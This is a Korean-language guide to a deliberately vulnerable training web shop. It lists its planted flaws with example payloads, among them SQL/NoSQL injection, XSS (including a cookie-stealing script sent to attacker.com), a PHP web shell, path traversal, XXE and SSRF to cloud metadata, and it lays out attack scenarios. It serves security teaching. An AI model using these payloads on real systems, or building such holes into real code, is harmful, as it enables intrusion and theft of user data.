# 🛡️ 취약점 목록 및 실습 가이드

## ⚠️ 경고
이 플랫폼은 교육 목적으로 의도적으로 취약점을 포함하고 있습니다. 
**절대로 실제 프로덕션 환경에서 사용하지 마십시오.**

---

## 📋 구현된 취약점 목록

### 1. 인젝션 취약점 (Injection)

#### 1.1 SQL Injection
**위치**: `/backend/src/routes/products.js`, `/backend/src/routes/auth.js`
**설명**: 사용자 입력을 직접 SQL 쿼리에 삽입
**예제 페이로드**:
```sql
-- 상품 검색에서
search=' OR 1=1 --

-- 로그인에서
username=admin'--
password=anything
```
**테스트 방법**:
1. 상품 검색 페이지에서 `' OR 1=1 --` 입력
2. 모든 상품이 조회되는지 확인
3. 로그인 페이지에서 SQL 인젝션으로 우회 시도

#### 1.2 NoSQL Injection (MongoDB)
**위치**: `/backend/src/routes/chat.js`
**설명**: MongoDB 쿼리에서 사용자 입력 검증 부족
**예제 페이로드**:
```json
{
  "user_id": {"$ne": null},
  "message": {"$regex": ".*"}
}
```

### 2. 크로스 사이트 스크립팅 (XSS)

#### 2.1 Reflected XSS
**위치**: `/backend/src/routes/search.js`
**설명**: 검색어가 필터링 없이 화면에 반영
**예제 페이로드**:
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
```

#### 2.2 Stored XSS
**위치**: 상품 설명, 댓글 시스템
**설명**: 사용자 입력이 데이터베이스에 저장되고 다른 사용자에게 표시
**예제 페이로드**:
```html
<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie
</script>
```

### 3. 인증 및 세션 관리 (Authentication & Session Management)

#### 3.1 Weak Password Hashing
**위치**: `/backend/src/models/User.js`
**설명**: MD5 해싱 사용 (매우 취약)
**테스트 방법**:
1. 회원가입 후 데이터베이스에서 패스워드 해시 확인
2. 온라인 MD5 디코더로 복호화 시도

#### 3.2 Session Fixation
**위치**: `/backend/src/middleware/session.js`
**설명**: 로그인 후 세션 ID가 변경되지 않음
**테스트 방법**:
1. 로그인 전 세션 ID 확인
2. 로그인 후 동일한 세션 ID 유지되는지 확인

#### 3.3 JWT Secret Exposure
**위치**: `/backend/.env`
**설명**: 약한 JWT 시크릿 키 사용
**취약점**: `JWT_SECRET=weak_secret`

### 4. 파일 업로드 취약점 (Unrestricted File Upload)

#### 4.1 Arbitrary File Upload
**위치**: `/backend/src/routes/upload.js`
**설명**: 파일 확장자 및 MIME 타입 검증 부족
**테스트 파일**:
```php
<?php
system($_GET['cmd']);
?>
```
**파일명**: `shell.php.jpg` (더블 확장자)

#### 4.2 Path Traversal
**위치**: 파일 업로드 경로 처리
**예제 페이로드**:
```
../../../etc/passwd
..\..\..\..\windows\system32\drivers\etc\hosts
```

### 5. 비즈니스 로직 취약점

#### 5.1 Price Manipulation
**위치**: `/frontend/src/pages/ProductPurchase.js`
**설명**: 클라이언트에서 가격 정보 조작 가능
**테스트 방법**:
1. 브라우저 개발자 도구 열기
2. 가격 필드 값 수정
3. 수정된 가격으로 결제 시도

#### 5.2 Race Condition
**위치**: `/backend/src/controllers/transactionController.js`
**설명**: 동시 거래 요청시 재고 확인 로직 문제
**테스트 방법**:
1. 동일한 상품에 대해 동시에 여러 구매 요청
2. 재고보다 많은 판매가 발생하는지 확인

#### 5.3 Coupon Abuse
**위치**: `/backend/src/services/couponService.js`
**설명**: 쿠폰 사용 횟수 검증 부족
**테스트 방법**:
1. 동일한 쿠폰으로 여러 번 할인 시도
2. 만료된 쿠폰 사용 시도

### 6. 보안 설정 오류 (Security Misconfiguration)

#### 6.1 Debug Mode Enabled
**설정**: `NODE_ENV=development`
**위험**: 상세한 에러 메시지 노출

#### 6.2 Default Credentials
**계정**: 
- Username: `admin`
- Password: `admin123`

#### 6.3 Verbose Error Messages
**위치**: 전역 에러 핸들러
**문제**: 스택 트레이스 및 내부 정보 노출

### 7. 민감한 데이터 노출 (Sensitive Data Exposure)

#### 7.1 Plaintext Storage
**위치**: `users` 테이블
**문제**: 주민등록번호, 신용카드 번호 평문 저장

#### 7.2 Information Disclosure
**위치**: API 응답
**문제**: 불필요한 사용자 정보 노출

### 8. XML 외부 엔티티 (XXE)

#### 8.1 XML Processing
**위치**: `/backend/src/routes/import.js`
**설명**: XML 파서가 외부 엔티티 처리
**예제 페이로드**:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<product><name>&xxe;</name></product>
```

### 9. 서버 사이드 요청 위조 (SSRF)

#### 9.1 Image URL Fetching
**위치**: `/backend/src/services/imageService.js`
**설명**: 사용자 제공 URL로 이미지 가져오기
**예제 페이로드**:
```
http://169.254.169.254/latest/meta-data/
http://localhost:3306/
file:///etc/passwd
```

### 10. 역직렬화 취약점 (Deserialization)

#### 10.1 Unsafe Deserialization
**위치**: `/backend/src/middleware/session.js`
**설명**: 사용자 세션 데이터 직렬화/역직렬화
**예제 페이로드**: Node.js serialize 페이로드 사용

---

## 🎯 실습 시나리오

### 시나리오 1: 관리자 계정 탈취
1. SQL Injection으로 사용자 정보 획득
2. 약한 패스워드 해싱 공격
3. 관리자 권한으로 시스템 접근

### 시나리오 2: 사용자 데이터 유출
1. XSS로 쿠키 탈취
2. 세션 하이재킹
3. 개인정보 접근

### 시나리오 3: 서버 접근
1. 파일 업로드 취약점으로 웹쉘 업로드
2. 시스템 명령어 실행
3. 서버 장악

### 시나리오 4: 금전적 손실
1. 가격 조작으로 무료 구매
2. 쿠폰 남용
3. Race Condition 공격

---

## 🛠️ 실습 도구

### 자동화 도구
- **SQLMap**: SQL Injection 테스트
- **Burp Suite**: 웹 애플리케이션 보안 테스트
- **OWASP ZAP**: 취약점 스캐닝
- **Nikto**: 웹 서버 취약점 스캔

### 수동 테스트
- **Browser DevTools**: 클라이언트 사이드 조작
- **Postman**: API 테스트
- **curl**: 직접 HTTP 요청

---

## 📝 실습 보고서 템플릿

각 취약점 테스트 후 다음 형식으로 보고서 작성:

```markdown
## 취약점 발견 보고서

**취약점 유형**: [예: SQL Injection]
**심각도**: [Critical/High/Medium/Low]
**발견 위치**: [파일 경로 및 라인]
**공격 벡터**: [사용한 페이로드]
**영향도**: [가능한 피해 범위]
**PoC (Proof of Concept)**: [실제 실행 스크린샷]
**해결 방안**: [보안 패치 제안]
```

---

## ⚠️ 주의사항

1. **격리된 환경에서만 실습**: Docker 컨테이너 사용 권장
2. **실제 데이터 사용 금지**: 테스트 데이터만 사용
3. **네트워크 분리**: 인터넷과 격리된 환경에서 실습
4. **법적 준수**: 본인 소유의 시스템에서만 테스트
5. **학습 목적**: 악의적 사용 절대 금지

---

## 🔧 취약점 제거 가이드

실습 후 보안 패치를 적용하여 안전한 코드로 변경하는 방법도 제공합니다.
자세한 내용은 `/security/PATCH_GUIDE.md` 참조.